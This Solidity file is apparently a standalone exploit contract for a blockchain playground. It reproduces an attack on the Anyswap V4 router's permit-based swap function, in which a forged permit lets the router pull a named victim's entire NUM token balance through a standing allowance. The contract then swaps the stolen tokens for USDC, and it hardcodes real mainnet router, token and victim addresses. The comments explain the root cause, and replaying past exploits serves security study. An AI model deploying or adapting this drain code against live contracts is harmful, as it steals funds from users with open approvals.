// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-11-NUM).
//
// The DeFiHackLabs PoC (test/NUM_exp.sol) runs the attack INLINE in the Foundry
// test contract: the test itself plays the role of the malicious `token`
// (its `underlying()` returns NUM; `depositVault`/`burn` are no-ops) and calls
// `AnyswapV4Router.anySwapOutUnderlyingWithPermit(...)`. There is no standalone
// contract to deploy. This contract is a faithful, self-contained copy of that
// inline attack so the playground can deploy it and record `run()`. Logic and
// constants are copied verbatim from the test (NUM has no `permit`, so the
// proxy fallback returns success and the forged signature is never checked; the
// router then `transferFrom`s the victim's NUM into THIS contract via the
// victim's standing MAX_UINT allowance, after which the stolen NUM is dumped
// into the NUM/USDC UniswapV2 pair for USDC).
//
// Root cause: AnyswapV4Router.anySwapOutUnderlyingWithPermit calls
// `IERC20(_underlying).permit(...)` but never verifies it actually granted an
// allowance. NUM's `TokenProxy`/`ERC677InitializableToken` has no `permit`, so
// the call lands on the empty fallback and silently succeeds — the router then
// `transferFrom`s the victim's balance using the victim's PRE-EXISTING infinite
// allowance, sending it into the attacker-controlled `token`.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IAnyswapV4Router {
    function anySwapOutUnderlyingWithPermit(
        address from,
        address token,
        address to,
        uint256 amount,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s,
        uint256 toChainID
    ) external;
}

interface IUniRouterV3 {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to
    ) external payable returns (uint256 amountOut);
}

contract NumDrain {
    // The Anyswap V4 router (vulnerable contract) on Ethereum mainnet.
    IAnyswapV4Router constant ROUTER = IAnyswapV4Router(0x765277EebeCA2e31912C9946eAe1021199B39C61);
    // NUM (TokenProxy → ERC677InitializableToken, no permit) — the drained token.
    IERC20 constant NUM = IERC20(0x3496B523e5C00a4b4150D6721320CdDb234c3079);
    // USDC — the dump token the stolen NUM is cashed into.
    IERC20 constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    // WETH9 (approved to the router like the original test, harmless here).
    IERC20 constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    // Uniswap V3 SwapRouter02 — routes the NUM→USDC swap through the V2 pair.
    IUniRouterV3 constant UNI_ROUTER = IUniRouterV3(0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45);

    // The victim whose NUM balance + standing router allowance the attack pulls.
    address constant VICTIM = 0x78AC2624a2Cd193E8dEfE9F39A9528e8bd4a368c;

    // The victim's full NUM balance at the fork block (taken verbatim from the
    // DeFiHackLabs PoC trace).
    uint256 constant AMOUNT = 557_754_450_001_980_916_242_788;

    // Receiver of the dumped USDC (set to the playground attacker EOA so profit
    // is measured there). Overridden via constructor for flexibility.
    address public immutable receiver;

    constructor(address _receiver) {
        receiver = _receiver;
    }

    // The recorded entrypoint. This contract IS the malicious `token`: it returns
    // NUM from `underlying()`, and its `depositVault`/`burn` are no-ops, so the
    // router's real `NUM.transferFrom(victim → this)` is never offset by a burn.
    function run() external {
        ROUTER.anySwapOutUnderlyingWithPermit(
            VICTIM, // from   — whose NUM is pulled (standing MAX_UINT allowance)
            address(this), // token — THIS contract is the fake anyToken
            address(this), // to    — router's _anySwapOut burn target (no-op here)
            AMOUNT, // amount — the victim's full NUM balance
            100_000_000_000_000_000_000, // deadline (far future)
            0, // v (dummy — NUM has no permit, so the call is a no-op success)
            bytes32(uint256(0x3078)), // r (dummy)
            bytes32(uint256(0x3078)), // s (dummy)
            12 // toChainID — the router emits LogAnySwapOut as if bridging
        );

        // The victim's NUM now sits in THIS contract. Dump it for USDC.
        NUM.approve(address(UNI_ROUTER), type(uint256).max);
        WETH.approve(address(UNI_ROUTER), type(uint256).max);
        NUM.transfer(address(UNI_ROUTER), AMOUNT);
        address[] memory path = new address[](2);
        path[0] = address(NUM);
        path[1] = address(USDC);
        UNI_ROUTER.swapExactTokensForTokens(0, 0, path, receiver);
    }

    // --- malicious fake anyToken callbacks (the trust boundary the router never checks) ---

    // Router calls this (staticcall) to learn the "underlying" — return NUM so the
    // real `NUM.transferFrom(victim → token)` pulls real value into THIS contract.
    function underlying() external returns (address) {
        return address(NUM);
    }

    // Router calls this after the transferFrom expecting it to mint anyTokens.
    // No-op: nothing is minted; the underlying stays here.
    function depositVault(uint256, address) external returns (uint256) {
        return AMOUNT;
    }

    // Router's _anySwapOut calls this expecting a cross-chain burn of anyTokens.
    // No-op: nothing is burned (there were never any anyTokens).
    function burn(address, uint256) external returns (bool) {
        return true;
    }
}
